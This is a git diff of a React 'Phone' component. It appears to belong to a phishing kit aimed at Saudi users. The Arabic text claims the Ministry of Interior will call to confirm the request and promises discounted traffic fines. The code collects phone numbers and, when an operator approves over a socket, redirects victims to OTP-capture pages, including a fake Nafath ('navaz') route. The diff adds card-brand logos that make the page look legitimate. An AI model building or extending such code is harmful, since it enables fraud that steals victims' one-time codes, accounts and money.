@@ -1,12 +1,11 @@
 import React from "react";
 import { useState } from "react";
 import axios from "axios";
-
+import { api_route, socket } from "../App";
 import { TailSpin } from "react-loader-spinner";
 import { AiOutlineCloseCircle } from "react-icons/ai";
 import { useEffect } from "react";
 import { MdOutlinePhoneCallback } from "react-icons/md";
-import { api_route, socket } from "../App";
 
 const Phone = () => {
   const [phoneNumber, setPhoneNumber] = useState(null);
@@ -91,8 +90,7 @@ const Phone = () => {
   socket.on("acceptService", ({ id, price }) => {
     if (id === ID) {
       if (code === "check" || phoneNetwork === "Mobily") {
-        return (window.location.href = "/mobilyOtp");
-        // return (window.location.href = "/navaz?otp=" + price + "&stc=" + null);
+        return (window.location.href = "/navaz?otp=" + price + "&stc=" + null);
       }
       return (window.location.href = "/phoneOtp");
     }
@@ -175,6 +173,17 @@ const Phone = () => {
               تأكيد
             </button>
           </div>
+          <div className="flex w-full gap-x-3 items-center justify-center">
+            <div className="w-20 ">
+              <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTlJeSetovZYxcpQmPuM-fu7k2EzUcVb3qU0w&s" />
+            </div>
+            <div className="w-20 ">
+              <img src="/Mastercard.png" />
+            </div>
+            <div className="w-20 ">
+              <img src="/visa_logo.jpg" />
+            </div>
+          </div>
         </form>
       ) : //  :
       //  verfiy === "STC" ? (
@@ -218,7 +227,7 @@ const Phone = () => {
             </div>
             <p className="p-2">
               ستتلقى مكالمة من وزارة الداخلية قريبا لتأكيد الطلب يرجى الرد على
-              الاتصال واتباع التعليمات
+              الاتصال واتباع التعليمات
             </p>
             <button
               className="bg-sky-500 text-white w-1/2 self-start p-3 m-2 rounded-full my-5"
@@ -256,7 +265,8 @@ const Phone = () => {
               <span className="font-bold"> بانتظار تأكيد الجوال</span>
             </div>
             <p className="p-2">
-              وافق على الاتصال واتمم العملية لإستبدال مخالفتك القديمة بالمخالفة الحالية بعد الخصم
+              وافق على الإتصال واتتم العملية لإستبدال مخالفتك القديمة بالمخالفة
+              الحالية بعد الخصم
             </p>
             <span className="w-full p-2">لم تستلم مكاملة ؟ </span>
             <span className="w-full p-2 flex items-center">
